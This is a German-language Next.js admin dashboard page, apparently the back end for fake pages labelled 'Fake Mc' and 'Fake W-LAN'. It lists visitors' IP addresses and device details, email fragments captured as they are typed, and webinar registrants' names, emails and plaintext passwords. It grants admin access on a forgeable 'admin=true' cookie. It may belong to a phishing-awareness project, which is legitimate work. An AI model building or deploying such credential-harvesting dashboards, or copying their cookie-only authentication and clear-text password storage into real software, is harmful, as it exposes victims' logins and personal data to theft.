import { cookies } from "next/headers";
import { redirect } from "next/navigation";
import { Button } from "@/components/ui/button";

import {
  Card,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";

import supabaseClient from "@/lib/supabase"; // Pfad anpassen je nach Ordnerstruktur
import { Component as PieChartBrowserFakeMcComponent } from "@/app/own_components/piechartcomponent_browser_fake_mc";
import { Component as PieChartOsFakeMcComponent } from "@/app/own_components/piechartcomponent_os_fake_mc";
import { Component as PieChartDeviceFakeMcComponent } from "@/app/own_components/piechartcomponent_device_fake_mc";
import { Component as PieChartComponent } from "@/app/own_components/piechartcomponent";
import { Component as PieChartBrowserComponent } from "@/app/own_components/piechartcomponent_browser";
import { Component as PieChartOsComponent } from "@/app/own_components/piechartcomponent_os";
import {
  Table,
  TableBody,
  TableCaption,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";

export default async function DashboardPage() {
  const cookieStore = await cookies();
  const isAdmin = cookieStore.get("admin")?.value === "true";

  if (!isAdmin) {
    redirect("/login");
  }

  const { data: session_time_logs, error } = await supabaseClient
    .from("session_time_logs")
    .select("id, session_id, time_on_page_ms, completed");

  if (error) {
    console.error("Supabase Error:", error.message);
    return <div>Fehler beim Laden der Daten.</div>;
  }

  const { data: decision_speed_logs, error: decisionSpeedError } =
    await supabaseClient
      .from("decision_speed_logs")
      .select("id, session_id, time_to_submit_ms");

  if (decisionSpeedError) {
    console.error("Supabase Error:", decisionSpeedError.message);
    return <div>Fehler beim Laden der Daten.</div>;
  }
  const { data: click_log, error: clickLogError } = await supabaseClient
    .from("click_log")
    .select("id, session_id, tag_name, text, timestamp");
  if (clickLogError) {
    console.error("Supabase Error:", clickLogError.message);
    return <div>Fehler beim Laden der Daten.</div>;
  }

  const { data: wlan_tracking_log, error: wlanTrackingError } =
    await supabaseClient
      .from("wlan_tracking_log")
      .select("id, created_at, ip_address, device_type, browser, os, referrer");
  if (wlanTrackingError) {
    console.error("Supabase Error:", wlanTrackingError.message);
    return <div>Fehler beim Laden der Daten.</div>;
  }
  const { data: tracking_log, error: trackingError } = await supabaseClient
    .from("tracking_log")
    .select(
      "id, ip_address, ip_address, device_type, browser, os, country, referrer, session_id, timestamp"
    );
  if (trackingError) {
    console.error("Supabase Error:", trackingError.message);
    return <div>Fehler beim Laden der Tracking Daten.</div>;
  }
  const { data: click_to_submit_log, error: clickToSubmitError } =
    await supabaseClient
      .from("click_to_submit_log")
      .select("id,session_id, total_clicks, timestamp");
  if (trackingError) {
    console.error(
      "Supabase Error:",
      clickToSubmitError?.message || "Unknown error"
    );
    return <div>Fehler beim Laden der Click to Submit Daten.</div>;
  }

  const { data: webinar_registrations, error: webinarRegistrationError } =
  await supabaseClient
    .from("webinar_registrations")
    .select("id, name, email, password, created_at");
if (webinarRegistrationError) {
  console.error(
    "Supabase Error:",
    webinarRegistrationError?.message || "Unknown error"
  );
  return <div>Fehler beim Laden der Webinar Daten.</div>;
}

const { data: email_input_log, error: emailInputLogError } =
await supabaseClient
  .from("email_input_log")
  .select("*");
if (emailInputLogError) {
console.error(
  "Supabase Error:",
  emailInputLogError?.message || "Unknown error"
);
return <div>Fehler beim Laden der Email Input Daten.</div>;
}

  return (
    <main className="min-h-screen bg-gray-100 p-6">
      <div className="max-w-4xl mx-auto space-y-8">
        <header className="flex items-center justify-between">
          <h1 className="text-3xl font-bold">Admin Dashboard</h1>
          <form action="/api/logout" method="GET">
            <Button variant="outline" type="submit">
              Logout
            </Button>
          </form>
        </header>
        <div>
          <h2 className="text-2xl font-semibold mb-4 px-4">Fake Mc</h2>
        <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 xl:grid-cols-5 px-4">
          <Card>
            <CardHeader className="relative">
              <CardDescription>Sessions mit Submit gesamt</CardDescription>
              <CardTitle className="text-2xl font-semibold tabular-nums">
                {session_time_logs?.length ?? 0}
              </CardTitle>
            </CardHeader>
            <CardFooter className="text-muted-foreground">
              Aktualisiert: {new Date().toLocaleDateString()}
            </CardFooter>
          </Card>

          <Card>
            <CardHeader className="relative">
              <CardDescription>Durchschnittliche Zeit</CardDescription>
              <CardTitle className="text-2xl font-semibold tabular-nums">
                {session_time_logs && session_time_logs.length > 0
                  ? `${Math.round(
                      session_time_logs.reduce(
                        (acc, curr) => acc + curr.time_on_page_ms,
                        0
                      ) /
                        session_time_logs.length /
                        1000
                    )} Sek.`
                  : "0 Sek."}
              </CardTitle>
            </CardHeader>
            <CardFooter className="text-muted-foreground">
              Durchschnittliche Session-Zeit
            </CardFooter>
          </Card>

          <Card>
            <CardHeader className="relative">
              <CardDescription>Zeit bis zum Absenden</CardDescription>
              <CardTitle className="text-2xl font-semibold tabular-nums">
                {decision_speed_logs && decision_speed_logs.length > 0
                  ? `${Math.round(
                      decision_speed_logs.reduce(
                        (acc, curr) => acc + curr.time_to_submit_ms,
                        0
                      ) /
                        decision_speed_logs.length /
                        1000
                    )} Sek.`
                  : "0 Sek."}
              </CardTitle>
            </CardHeader>
            <CardFooter className="text-muted-foreground">
              Durchschnittliche Zeit bis zum Absenden der Entscheidung
            </CardFooter>
          </Card>
          <Card>
            <CardHeader className="relative">
              <CardDescription>Anzahl Clicks bis Submit</CardDescription>
              <CardTitle className="text-2xl font-semibold tabular-nums">
                {click_to_submit_log && click_to_submit_log.length > 0
                  ? `${(
                      click_to_submit_log.reduce(
                        (acc, curr) => acc + curr.total_clicks,
                        0
                      ) / click_to_submit_log.length
                    ).toFixed(2)} Kl.`
                  : "0.00 Kl."}
              </CardTitle>
            </CardHeader>
            <CardFooter className="text-muted-foreground">
              Durchschnittliche Anzahl der Clicks bis zum Absenden
            </CardFooter>
          </Card>

          <Card>
            <CardHeader className="relative">
              <CardDescription>Gesendete E-Mail-Adressen</CardDescription>
              <CardTitle className="text-2xl font-semibold tabular-nums">
                {click_log
                  ? click_log.filter(
                      (click) => click.text === "Jetzt teilnehmen"
                    ).length
                  : 0}
              </CardTitle>
            </CardHeader>
            <CardFooter className="text-muted-foreground">
              Aktualisiert: {new Date().toLocaleDateString()}
            </CardFooter>
          </Card>
        </div>
        </div>

        <div>
          <div className="grid grid-cols-1 gap-4 sm:grid-cols-1 xl:grid-cols-3 px-4">
            <PieChartDeviceFakeMcComponent/>
            <PieChartBrowserFakeMcComponent />
            <PieChartOsFakeMcComponent />

          </div>



          </div>
          <div>
          <h3 className=" font-semibold mb-4 px-4 pt-5 pb-2">Email Input Log</h3>
          <div className="max-h-[300px] overflow-y-auto rounded-md border m-4">
          <Card className="p-3">
            <Table>
              <TableCaption >Email Input Log</TableCaption>
              
              <TableHeader >
                <TableRow >
                <TableHead className="w-[150px]">Datum</TableHead>
                <TableHead className="w-[150px]">Fragment</TableHead>

                </TableRow>
              </TableHeader>
              <TableBody>
                {email_input_log?.map((entry) => (
                  <TableRow key={entry.id}>
                    <TableCell>
                      {new Date(entry.timestamp).toLocaleString()}
                    </TableCell>

                    <TableCell>{entry.email_fragment}</TableCell>

                  </TableRow>
                ))}
              </TableBody>
            
            </Table>
            </Card>
          </div>
          <h3 className=" font-semibold mb-4 px-4 pt-5 pb-2">Fake Mc Tracking</h3>
          <div className="max-h-[300px] overflow-y-auto rounded-md border m-4">
            <Table>
              <TableCaption>Fake Mc Logs</TableCaption>
              <TableHeader>
                <TableRow>
                  <TableHead className="w-[150px]">Datum</TableHead>
                  <TableHead className="w-[150px]">IP Adresse</TableHead>
                  <TableHead className="w-[150px]">Gerätetyp</TableHead>
                  <TableHead className="w-[150px]">Browser</TableHead>
                  <TableHead className="w-[150px]">Betriebssystem</TableHead>
                  <TableHead className="w-[150px]">Referrer</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {tracking_log?.map((entry) => (
                  <TableRow key={entry.id}>
                    <TableCell>
                      {new Date(entry.timestamp).toLocaleString()}
                    </TableCell>
                    <TableCell>{entry.ip_address}</TableCell>
                    <TableCell>{entry.device_type}</TableCell>
                    <TableCell>{entry.browser}</TableCell>
                    <TableCell>{entry.os}</TableCell>
                    <TableCell>{entry.referrer}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </div>
  
          <div>
          <h2 className="text-2xl font-semibold mb-4 px-4 pt-5 pb-2">Webinar Registrations</h2>
          <div className="max-h-[300px] overflow-y-auto rounded-md border m-4">
          <Card className="p-3">
            <Table>
              <TableCaption >Webinar Registrierungen</TableCaption>
              
              <TableHeader >
                <TableRow >
                <TableHead className="w-[150px]">Zeit</TableHead>
                  <TableHead className="w-[150px]">Name</TableHead>
                  <TableHead className="w-[150px]">E-Mail</TableHead>
                  <TableHead className="w-[150px]">Passwort</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {webinar_registrations?.map((entry) => (
                  <TableRow key={entry.id}>
                    <TableCell>
                      {new Date(entry.created_at).toLocaleString()}
                    </TableCell>
                    <TableCell>{entry.name}</TableCell>
                    <TableCell>{entry.email}</TableCell>
                    <TableCell>{entry.password}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            
            </Table>
            </Card>
          </div>
        
        </div>
        
        <h2 className="text-2xl font-semibold mb-4 px-4 pt-5 pb-2">Fake W-Lan</h2>
          <div className="grid grid-cols-1 gap-4 sm:grid-cols-1 xl:grid-cols-3 px-4">
            <PieChartComponent />
            <PieChartBrowserComponent />
            <PieChartOsComponent />
          </div>
          
          <h3 className=" font-semibold mb-4 px-4 pt-5 pb-2">Fake W-LAN Tracking</h3>
          <div className="max-h-[300px] overflow-y-auto rounded-md border m-4">
            <Table>
              <TableCaption>Fake W-LAN Tracking</TableCaption>
              <TableHeader>
                <TableRow>
                  <TableHead className="w-[150px]">Datum</TableHead>
                  <TableHead className="w-[150px]">IP Adresse</TableHead>
                  <TableHead className="w-[150px]">Gerätetyp</TableHead>
                  <TableHead className="w-[150px]">Browser</TableHead>
                  <TableHead className="w-[150px]">Betriebssystem</TableHead>
                  <TableHead className="w-[150px]">Referrer</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {wlan_tracking_log?.map((entry) => (
                  <TableRow key={entry.id}>
                    <TableCell>
                      {new Date(entry.created_at).toLocaleString()}
                    </TableCell>
                    <TableCell>{entry.ip_address}</TableCell>
                    <TableCell>{entry.device_type}</TableCell>
                    <TableCell>{entry.browser}</TableCell>
                    <TableCell>{entry.os}</TableCell>
                    <TableCell>{entry.referrer}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </div>
        </div>

      </div>
    </main>
  );
}
